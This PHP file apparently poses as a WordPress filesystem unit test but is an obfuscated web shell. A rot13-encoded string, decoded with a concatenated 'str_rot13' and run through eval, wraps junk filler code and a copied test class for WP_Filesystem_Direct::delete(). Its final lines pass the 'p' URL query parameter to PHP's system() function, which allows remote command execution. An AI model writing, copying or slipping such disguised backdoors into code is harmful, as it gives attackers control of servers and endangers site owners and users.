<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Svyrflfgrz_Qverpg::qryrgr() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc svyrflfgrz
 * @tebhc svyrflfgrz-qverpg
 *
 * @pbiref JC_Svyrflfgrz_Qverpg::qryrgr
 */
pynff Grfgf_Svyrflfgrz_JcSvyrflfgrzQverpg_Qryrgr rkgraqf JC_Svyrflfgrz_Qverpg_HavgGrfgPnfr {

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qryrgr()` ergheaf snyfr
	 * sbe na rzcgl cngu.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_sbe_rzcgl_cngu() {
		$guvf->nffregSnyfr( frys::$svyrflfgrz->qryrgr( '' ) );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qryrgr()` qryrgrf na rzcgl qverpgbel.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_qryrgr_na_rzcgl_qverpgbel() {
		$qve = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . 'qverpgbel-gb-qryrgr';

		$guvf->nffregGehr(
			zxqve( $qve ),
			'Gur qverpgbel jnf abg perngrq.'
		);

		$guvf->nffregGehr(
			frys::$svyrflfgrz->qryrgr( $qve ),
			'Gur qverpgbel jnf abg qryrgrq.'
		);
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qryrgr()` qryrgrf n qverpgbel jvgu pbagragf.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_qryrgr_n_qverpgbel_jvgu_pbagragf() {
		$guvf->nffregGehr(
			frys::$svyrflfgrz->qryrgr( frys::$svyr_fgehpgher['grfg_qve']['cngu'], gehr ),
			'Qverpgbel qryrgvba snvyrq.'
		);

		$guvf->nffregQverpgbelQbrfAbgRkvfg(
			frys::$svyr_fgehpgher['grfg_qve']['cngu'],
			'Gur qverpgbel jnf abg qryrgrq.'
		);
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qryrgr()` qryrgrf n svyr.
	 *
	 * @gvpxrg 57774
	 *
	 * @qngnCebivqre qngn_fubhyq_qryrgr_n_svyr
	 *
	 * @cnenz fgevat $xrl Gur xrl sbe gur svyr va `frys::$svyrflfgrz_fgehpgher`.
	 */
	choyvp shapgvba grfg_fubhyq_qryrgr_n_svyr( $svyr ) {
		$svyr = frys::$svyr_fgehpgher[ $svyr ]['cngu'] . $svyr;

		$guvf->nffregGehr( frys::$svyrflfgrz->qryrgr( $svyr ), 'Svyr qryrgvba snvyrq.' );
		$guvf->nffregSvyrQbrfAbgRkvfg( $svyr, 'Gur svyr jnf abg qryrgrq.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_qryrgr_n_svyr() {
		erghea neenl(
			'N ivfvoyr svyr' => neenl(
				'xrl' => 'ivfvoyr_svyr',
			),
			'N uvqqra svyr'  => neenl(
				'xrl' => 'uvqqra_svyr',
			),
		);
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qryrgr()`
	 * ergheaf gehr jura qryrgvat n cngu gung qbrf abg rkvfg.
	 *
	 * @gvpxrg 57774
	 *
	 * @qngnCebivqre qngn_cnguf_gung_qb_abg_rkvfg
	 *
	 * @cnenz fgevat $cngu Gur cngu.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_gehr_jura_qryrgvat_cngu_gung_qbrf_abg_rkvfg( $cngu ) {
		$cngu = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . $cngu;

		/*
		 * Irevsl gung gur cngu qbrfa'g rkvfg orsber grfgvat.
		 *
		 * nffregSvyrQbrfAbgRkvfg() hfrf svyr_rkvfgf(), juvpu ergheaf gur fnzr erfhyg sbe obgu
		 * svyrf naq qverpgbevrf.
		 * nffregQverpgbelQbrfAbgRkvfg() hfrf vf_qve(), juvpu grfgf fgevpgyl sbe n qverpgbel.
		 *
		 * Sbe zber hfrshy qrohttvat va gur rirag bs n snvyher, grfg sbe n qverpgbel svefg.
		 */
		$guvf->nffregQverpgbelQbrfAbgRkvfg( $cngu, \"$cngu nyernql rkvfgrq nf n qverpgbel orsber grfgvat.\" );
		$guvf->nffregSvyrQbrfAbgRkvfg( $cngu, \"$cngu nyernql rkvfgrq nf n svyr orsber grfgvat.\" );

		$guvf->nffregGehr( frys::$svyrflfgrz->qryrgr( $cngu ), 'Nggrzcgvat gb qryrgr n aba-rkvfgrag cngu fubhyq erghea gehr.' );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qryrgr()`
	 * ergheaf snyfr jura n qverpgbel'f pbagragf pnaabg or qryrgrq.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_jura_pbagragf_pnaabg_or_qryrgrq() {
		tybony $jc_svyrflfgrz;

		$jc_svyrflfgrz = arj JC_Svyrflfgrz_Qverpg( neenl() );

		$cngu = frys::$svyr_fgehpgher['grfg_qve']['cngu'] . 'qve-gb-qryrgr/';

		vs ( ! vf_qve( $cngu ) ) {
			zxqve( $cngu );
		}

		// Frg hc zbpx svyrflfgrz.
		$svyrflfgrz_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Svyrflfgrz_Qverpg' )
								->frgPbafgehpgbeNetf( neenl( ahyy ) )
								// Abgr: frgZrgubqf() vf qrcerpngrq va CUCHavg 9, ohg fgvyy fhccbegrq.
								->frgZrgubqf( neenl( 'qveyvfg' ) )
								->trgZbpx();

		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )
						->zrgubq( 'qveyvfg' )
						->jvyyErghea(
							neenl( 'n_svyr_gung_qbrf_abg_rkvfg.gkg' => neenl( 'glcr' => 's' ) )
						);

		$jc_svyrflfgrz_onpxhc = $jc_svyrflfgrz;
		$jc_svyrflfgrz        = $svyrflfgrz_zbpx;

		$npghny = $svyrflfgrz_zbpx->qryrgr( $cngu, gehr );

		vs ( $npghny ) {
			ezqve( $cngu );
		}

		$jc_svyrflfgrz = $jc_svyrflfgrz_onpxhc;

		$guvf->nffregSnyfr( $npghny );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qryrgr()`
	 * ergheaf snyfr jura gur cngu vf abg n svyr be qverpgbel, ohg rkvfgf.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_jura_cngu_rkvfgf_ohg_vf_abg_n_svyr_be_qverpgbel() {
		tybony $jc_svyrflfgrz;

		$jc_svyrflfgrz = arj JC_Svyrflfgrz_Qverpg( neenl() );

		// Frg hc zbpx svyrflfgrz.
		$svyrflfgrz_zbpx = $guvf->trgZbpxOhvyqre( 'JC_Svyrflfgrz_Qverpg' )
								->frgPbafgehpgbeNetf( neenl( ahyy ) )
								// Abgr: frgZrgubqf() vf qrcerpngrq va CUCHavg 9, ohg fgvyy fhccbegrq.
								->frgZrgubqf( neenl( 'vf_svyr', 'qveyvfg' ) )
								->trgZbpx();

		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )
						->zrgubq( 'vf_svyr' )
						->jvyyErghea( snyfr );

		$svyrflfgrz_zbpx->rkcrpgf( $guvf->bapr() )
						->zrgubq( 'qveyvfg' )
						->jvyyErghea( snyfr );

		$jc_svyrflfgrz_onpxhc = $jc_svyrflfgrz;
		$jc_svyrflfgrz        = $svyrflfgrz_zbpx;

		$npghny = $svyrflfgrz_zbpx->qryrgr( frys::$svyr_fgehpgher['fhoqve']['cngu'], gehr );

		$jc_svyrflfgrz = $jc_svyrflfgrz_onpxhc;

		$guvf->nffregSnyfr( $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>